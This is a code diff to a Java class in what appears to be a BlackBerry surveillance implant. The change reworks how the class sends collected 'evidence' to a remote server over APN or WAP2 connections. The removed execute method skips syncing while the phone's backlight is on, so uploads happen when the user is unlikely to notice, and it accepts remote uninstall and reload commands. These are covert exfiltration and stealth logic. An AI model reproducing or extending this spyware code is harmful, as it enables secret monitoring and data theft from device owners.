@@ -4,23 +4,12 @@ package blackberry.action.sync;
 import java.io.EOFException;
 import java.util.Vector;
 
-import net.rim.device.api.system.Backlight;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.AgentManager;
 import blackberry.action.Apn;
-import blackberry.action.SyncAction;
-import blackberry.action.SyncActionInternet;
-import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.ApnTransport;
 import blackberry.action.sync.transport.Wap2Transport;
-import blackberry.agent.Agent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
-import blackberry.evidence.Evidence;
-import blackberry.evidence.EvidenceCollector;
-import blackberry.transfer.ProtocolException;
-import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
@@ -30,13 +19,9 @@ public class SyncActionApn extends SyncAction {
     //#endif
 
     String host;
-    int port = 80;
 
     public SyncActionApn(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
-
-        protocol = new ZProtocol();
+        super(actionId_, confParams);
 
         //#ifdef DBC
         Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
@@ -90,21 +75,32 @@ public class SyncActionApn extends SyncAction {
                 databuffer.readFully(stringRaw);
                 apn.pass = WChar.getString(stringRaw, true);
 
-                //#ifdef DEBUG
-                debug.trace("adding apn: " + apn);
-                //#endif
-                apns.addElement(apn);
+                if (apn.isValid()) {
+                    //#ifdef DEBUG
+                    debug.trace("adding apn: " + apn);
+                    //#endif
+                    apns.addElement(apn);
+                }
             }
 
-            //#ifdef DBC
-            Check.ensures(apns.size() == entries, "parse apns entries");
-            //#endif
-
-            if (entries == 0) {
-                transport = new Wap2Transport(host, port);
+            if (apns.size() == 0) {
+                //#ifdef DEBUG
+                debug.trace("No valid apn, adding Wap2Transport");
+                //#endif
+                transports.addElement(new Wap2Transport(host));
             } else {
-                transport = new Wap2Transport(host, port);
-                //transport = new ApnTransport(host, port, apns);
+                for (int i = 0; i < apns.size(); i++) {
+                    Apn apn = (Apn) apns.elementAt(i);
+                    //#ifdef DEBUG
+                    debug.trace("parse, adding ApnTransport: " + apn);
+                    //#endif
+
+                    //#ifdef DBC
+                    Check.asserts(apn.apn.length() > 0, "Invalid apn");
+                    //#endif
+
+                    transports.addElement(new ApnTransport(host, apn));
+                }
             }
 
         } catch (final EOFException e) {
@@ -116,93 +112,12 @@ public class SyncActionApn extends SyncAction {
         return true;
     }
 
+    protected boolean initTransport() {
+        return true;
+    }
+
     public String toString() {
-        return "SyncApn " + transport;
+        return "SyncApn ";
     }
 
-    public boolean execute(Event event) {
-        //#ifdef DBC
-        Check.requires(protocol != null, "execute: null protocol");
-        Check.requires(transport != null, "execute: null transport");
-        //#endif
-        
-        if (status.synced == true) {
-            //#ifdef DEBUG
-            debug.warn("Already synced in this action: skipping");
-            //#endif
-            return false;
-        }
-
-        if (status.crisisSync()) {
-            //#ifdef DEBUG
-            debug.warn("SyncAction - no sync, we are in crisis");
-            //#endif
-            return false;
-        }
-        
-        if (Backlight.isEnabled()) {
-            //#ifdef DEBUG
-            debug.warn("SyncAction - no sync, backlight enabled");
-            //#endif
-            return false;
-        }
-
-        wantReload = false;
-        wantUninstall = false;
-
-        agentManager.reStart(Agent.AGENT_DEVICE);
-        
-        boolean ret=false;
-        
-        if (transport.isAvailable()) {
-            //#ifdef DEBUG
-            debug.trace("execute: transport available");
-            //#endif
-            protocol.init(transport);
-            
-            try {
-                //#ifdef DEBUG
-                debug.ledStart(Debug.COLOR_YELLOW);
-                //#endif
-                
-                ret = protocol.perform();
-                wantUninstall = protocol.uninstall;
-                wantReload = protocol.reload;
-            } catch (ProtocolException e) {
-                //#ifdef DEBUG
-                debug.error(e);
-                //#endif
-                ret = false;
-            }finally{
-                //#ifdef DEBUG
-                debug.ledStop();
-                //#endif
-            }
-            
-            //#ifdef DEBUG
-            debug.trace("execute protocol: " + ret);
-            //#endif
-
-        }else{
-            //#ifdef DEBUG
-            debug.trace("execute: transport not available");
-            //#endif
-        }
-        
-        if (ret) {
-            //#ifdef DEBUG
-            debug.info("SyncAction OK");
-            Evidence.info("Sync:" + transport.getUrl());
-            //#endif
-
-            status.synced = true;
-            return true;
-        }
-
-        //#ifdef DEBUG
-        debug.error("InternetSend Unable to perform");
-        //#endif
-
-        return false;
-    }
 }
